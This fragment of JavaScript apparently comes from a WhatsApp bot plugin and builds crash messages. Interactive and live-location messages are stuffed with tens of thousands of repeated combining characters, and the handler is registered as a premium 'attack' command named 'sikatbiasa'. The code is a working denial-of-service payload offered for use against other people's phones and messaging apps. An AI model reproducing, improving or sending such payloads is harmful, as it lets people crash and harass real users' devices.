...
async function skids(target, apalah) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({ viewOnceMessage: {message: {"interactiveMessage": {"header": {"title": "","subtitle": ""},"body": {"text": `V7V7V7V7V7V7V7V7V7 💀` + "ྦྷ9".repeat(50100)},"footer": {"text": "KokNdakNgefekJir"},"nativeFlowMessage": {"buttons": [{"name": "cta_url","buttonParamsJson": "{ display_text : 'Skidayo', url : , merchant_url : }"}],"messageParamsJson": "".repeat(892989)}}}}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `V7V7V7V7V7V7 💀` + "ྦྷ9".repeat(50150),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
handler.help = ['sikatbiasa']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(sikatbiasa)$/i;
